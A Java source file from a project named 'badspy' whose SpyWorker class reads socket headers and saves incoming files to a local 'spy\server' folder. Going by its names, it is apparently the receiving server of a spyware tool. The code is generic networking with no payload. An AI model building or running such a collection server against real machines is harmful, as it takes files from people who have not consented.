package com.blogspot.sontx.badspy.badserver.bo.worker;

import com.blogspot.sontx.badspy.badserver.bean.SpyDataHeader;
import com.blogspot.sontx.badspy.badserver.bo.SpyReader;
import com.blogspot.sontx.badspy.badserver.bo.SpyWriter;
import com.blogspot.sontx.jlog.Log;

import java.io.Closeable;
import java.io.File;
import java.io.IOException;
import java.net.Socket;

/**
 * Copyright 2016 by sontx
 * Created by xuans on 20/4/2016.
 */
public class SpyWorker extends Thread implements Closeable {
    private Socket socket;
    private SpyReader reader;
    private SpyWriter writer;
    private OnCompletedListener mOnCompletedListener = null;

    public void setOnCompletedListener(OnCompletedListener listener) {
        mOnCompletedListener = listener;
    }

    public SpyWorker(Socket socket) throws IOException {
        this.socket = socket;
        this.reader = new SpyReader(socket.getInputStream());
        this.writer = new SpyWriter(socket.getOutputStream());
    }

    @Override
    public void run() {
        SpyDataHeader header = null;
        try {
            while ((header = reader.readHeader()) != null) {
                processHeader(header);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        if (mOnCompletedListener != null)
            mOnCompletedListener.onCompleted(this);
    }

    private void processHeader(SpyDataHeader header) throws IOException {
        switch (header.getContentType()) {
            case SpyDataHeader.HEADER_FILE:
                receiveFile(header.getContentLength());
                break;
        }
    }

    private void receiveFile(int contentLength) throws IOException {
        Log.i(String.format("Receiving file[%d bytes]...", contentLength));
        SpyFileReceiver receiver = new SpyFileReceiver(reader, writer, contentLength, new File("C:\\Users\\xuans\\Desktop\\spy\\server"));
        try {
            receiver.start();
            Log.i("Received file");
        } finally {
            receiver.close();
        }
    }

    @Override
    public void close() throws IOException {
        socket.close();
    }

    public interface OnCompletedListener {
        void onCompleted(SpyWorker worker);
    }
}
